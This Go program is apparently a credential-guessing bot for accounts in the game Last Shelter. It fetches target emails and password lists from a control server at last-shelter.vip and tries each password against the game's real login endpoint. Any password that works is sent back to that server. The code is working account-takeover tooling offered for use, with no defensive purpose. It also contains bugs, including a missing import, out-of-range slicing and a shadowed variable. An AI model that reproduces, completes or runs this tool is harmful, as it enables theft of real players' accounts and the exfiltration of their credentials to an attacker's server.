package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"sync"
	"time"
)

type Job struct {
	JobID           string `json:"job_id"`
	Email           string `json:"email"`
	JobCompleted    bool   `json:"job_completed"`
	JobInProgress   bool   `json:"job_in_progress"`
	FileIndex       int    `json:"file_index"`
	PasswordFound   string `json:"password_found,omitempty"`
	FileProgress    int    `json:"file_progress"`
}

var (
	passwordDataFilename = "passwords.bin"
	jobDataFilename      = "job.bin"
	client               = &http.Client{}
	mu                   sync.Mutex
)

func getJobs() ([]Job, error) {
	authCode := "sdasdasdas"
	url := fmt.Sprintf("https://last-shelter.vip/admin/_tool/get-jobs/%s", authCode)
	response, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()

	var jobList []Job
	err = json.NewDecoder(response.Body).Decode(&jobList)
	if err != nil {
		return nil, err
	}
	return jobList, nil
}

func getFiles(jobID string) (map[string]interface{}, error) {
	url := fmt.Sprintf("https://last-shelter.vip/admin/_tool/get-job/%s", jobID)
	response, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()

	var fileData map[string]interface{}
	err = json.NewDecoder(response.Body).Decode(&fileData)
	if err != nil {
		return nil, err
	}
	return fileData, nil
}

func gameAccountValid(password string, email string) (bool, string, error) {
	_accountVerificationEndpoint := "https://lsaccount.im30.net/common/v1/login"
	formData := fmt.Sprintf(`{"email":"%s", "pass":"%s"}`, email, password)
	response, err := client.Post(_accountVerificationEndpoint, "application/json", strings.NewReader(formData))
	if err != nil {
		return false, "", err
	}
	defer response.Body.Close()

	var responseData map[string]interface{}
	err = json.NewDecoder(response.Body).Decode(&responseData)
	if err != nil {
		return false, "", err
	}
	code, _ := responseData["code"].(float64)
	return code == 10000, password, nil
}

func validatePasswords(job Job, passwords map[string]string, email string) (bool, string, error) {
	// Validate passwords concurrently
	passwordList := make([]string, 0, len(passwords))
	for _, v := range passwords {
		passwordList = append(passwordList, v)
	}

	fmt.Printf("Found passwords %d\n", len(passwordList))
	i := job.FileProgress
	fmt.Printf("starting JOB at %d\n", job.FileProgress)
	interval := 5
	updateInterval := interval * 50

	for i < len(passwordList) {
		routines := make([]func() (bool, string, error), 0, interval)
		for _, _pass := range passwordList[i : i+interval] {
			_pass := _pass // capture range variable
			routines = append(routines, func() (bool, string, error) {
				return gameAccountValid(_pass, email)
			})
		}
		i += 4
		var results []bool
		for _, routine := range routines {
			isFound, pass, err := routine()
			if err != nil {
				return false, "", err
			}
			results = append(results, isFound)
			if i%updateInterval == 0 {
				job.FileProgress += updateInterval
				err := createJobFile(job)
				if err != nil {
					return false, "", err
				}
			}
			if isFound {
				return isFound, pass, nil
			}
		}
		fmt.Printf("Counter : %d\n", i)
	}
	return false, "", nil
}

func updateBackend(pass string, jobID string) error {
	url := fmt.Sprintf("https://last-shelter.vip/admin/_tool/updates/%s/%s", jobID, pass)
	response, err := client.Post(url, "application/json", nil)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to update backend, status code: %d", response.StatusCode)
	}
	return nil
}

func createPasswordsFile(passwords map[string]string) error {
	data, err := json.Marshal(passwords)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(passwordDataFilename, data, 0644)
}

func createJobFile(job Job) error {
	data, err := json.Marshal(job)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(jobDataFilename, data, 0644)
}

func getNewData() (map[string]string, string, string, Job, error) {
	var passwordsData map[string]string
	var email, jobID string
	var job Job

	jobList, err := getJobs()
	if err != nil {
		return nil, "", "", Job{}, err
	}

	for _, _job := range jobList {
		if _job.JobInProgress && !_job.JobCompleted {
			fileData, err := getFiles(_job.JobID)
			if err != nil {
				return nil, "", "", Job{}, err
			}
			passwordsData = make(map[string]string)
			passwordsInterface, ok := fileData["passwords"].([]interface{})
			if !ok {
				return nil, "", "", Job{}, fmt.Errorf("error converting passwords data")
			}
			for _, v := range passwordsInterface {
				if passMap, ok := v.(map[string]interface{}); ok {
					passwordsData[passMap["key"].(string)] = passMap["value"].(string)
				}
			}
			email = _job.Email
			jobID = _job.JobID

			err = createJobFile(_job)
			if err != nil {
				return nil, "", "", Job{}, err
			}
			err = createPasswordsFile(passwordsData)
			if err != nil {
				return nil, "", "", Job{}, err
			}

			if jobID == "" {
				continue
			} else {
				job = _job
				break
			}
		}
	}
	return passwordsData, email, jobID, job, nil
}

func main() {
	var passwordsData map[string]string
	var email, jobID string
	var job Job

	if _, err := os.Stat(passwordDataFilename); err == nil {
		passwordData, err := ioutil.ReadFile(passwordDataFilename)
		if err != nil {
			panic(err)
		}
		err = json.Unmarshal(passwordData, &passwordsData)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(jobDataFilename); err == nil {
		jobData, err := ioutil.ReadFile(jobDataFilename)
		if err != nil {
			panic(err)
		}
		err = json.Unmarshal(jobData, &job)
		if err != nil {
			panic(err)
		}
		email = job.Email
		jobID = job.JobID
	}

	if email == "" || jobID == "" {
		var err error
		passwordsData, email, jobID, job, err = getNewData()
		if err != nil {
			panic(err)
		}
	}

	for {
		isFound, password, err := validatePasswords(job, passwordsData, email)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
		}

		if isFound {
			password := passwordsData[password]
			err := updateBackend(password, jobID)
			if err != nil {
				fmt.Printf("Error: %v\n", err)
			}
		}

		// Update local files
		time.Sleep(14400 * time.Second)
		passwordsData, email, jobID, job, err := getNewData()
		if err != nil {
			fmt.Printf("Error: %v\n", err)
		}
	}
}
